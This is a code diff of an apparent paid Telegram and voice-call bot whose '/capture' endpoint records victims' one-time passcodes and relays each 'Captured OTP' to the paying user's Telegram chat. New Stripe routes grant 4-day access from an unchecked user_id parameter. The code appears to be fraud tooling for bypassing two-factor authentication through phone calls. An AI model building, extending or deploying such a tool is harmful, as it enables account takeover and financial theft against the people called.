@@ -1,6 +1,5 @@
 import os
 import asyncio
-import threading
 from datetime import datetime, timedelta, timezone
 from urllib.parse import quote
 
@@ -132,9 +131,7 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         else:
             keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton("📞 Make Call", callback_data="call")],
                 [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
-                [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
             ])
             await query.edit_message_text(
                 "📞 Send me your custom message for the call.\n\nOr type `/call` to reuse your last message.",
@@ -215,8 +212,7 @@ flask_app = Flask(__name__)
 @flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
 def telegram_webhook():
     update = Update.de_json(request.get_json(force=True), app_telegram.bot)
-    # Use run_coroutine_threadsafe to schedule async processing
-    asyncio.run_coroutine_threadsafe(app_telegram.process_update(update), app_telegram._loop)
+    asyncio.run(app_telegram.process_update(update))  # Safe, avoids _loop
     return "OK", 200
 
 @flask_app.route("/voice", methods=["POST", "GET"])
@@ -237,26 +233,18 @@ def capture():
     captured_otp[phone] = otp
     chat_id = phone_to_chat.get(phone)
     if chat_id:
-        requests.post(
-            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-            data={"chat_id": chat_id, "text": f"📩 Captured OTP: {otp}"}
-        )
+        app_telegram.bot.send_message(chat_id=chat_id, text=f"✅ Captured OTP: {otp}")
     return Response("OK", mimetype="text/plain")
 
-@flask_app.route("/call_status", methods=["POST"])
-def call_status():
-    # Optionally handle Twilio status updates
-    return Response("OK", mimetype="text/plain")
+@flask_app.route("/success", methods=["GET"])
+def stripe_success():
+    user_id = int(request.args.get("user_id"))
+    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
+    return "Payment success! You now have 4-day access."
 
-# -------------------------
-# Run Telegram loop in background
-# -------------------------
-def run_telegram():
-    app_telegram.run_polling()  # initializes the loop
-threading.Thread(target=run_telegram, daemon=True).start()
+@flask_app.route("/cancel", methods=["GET"])
+def stripe_cancel():
+    return "Payment canceled."
 
-# -------------------------
-# Run Flask
-# -------------------------
 if __name__ == "__main__":
     flask_app.run(host="0.0.0.0", port=PORT)
